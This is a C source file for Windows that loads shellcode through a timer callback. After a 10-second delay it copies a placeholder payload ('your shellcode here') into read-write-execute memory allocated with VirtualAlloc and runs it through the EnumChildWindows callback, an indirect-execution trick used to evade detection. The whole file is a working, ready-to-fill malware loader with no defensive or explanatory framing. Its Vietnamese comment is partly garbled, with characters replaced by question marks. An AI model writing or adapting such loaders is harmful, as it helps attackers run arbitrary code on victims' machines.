#include <Windows.h>

/*
Hàm SetTimer trong th? vi?n winuser.h ???c s? d?ng ?? t?o m?t b? h?n gi? (timer) và thi?t l?p m?t s? ki?n ?? g?i l?i (callback) sau m?t kho?ng th?i gian nh?t ??nh
UINT_PTR SetTimer(
  HWND      hWnd,           // C?a s? mà hàm g?i l?i s? ???c g?i t?i
  UINT_PTR  nIDEvent,       // ID c?a b? h?n gi?
  UINT      uElapse,        // Th?i gian gi?a các l?n g?i l?i (miligiây)
  TIMERPROC lpTimerFunc     // Con tr? ??n hàm g?i l?i
);
*/
VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime);
char shellcode[] = "your shellcode here";

int main() {
	UINT_PTR timerId = SetTimer(NULL, 1, 10000, TimerProc);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	KillTimer(NULL, timerId);
	return 0;
}
// Function Executed by TimerProc
VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime) {
	HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(hAlloc, shellcode, sizeof(shellcode));
	EnumChildWindows((HWND)NULL, (WNDENUMPROC)hAlloc, NULL);
}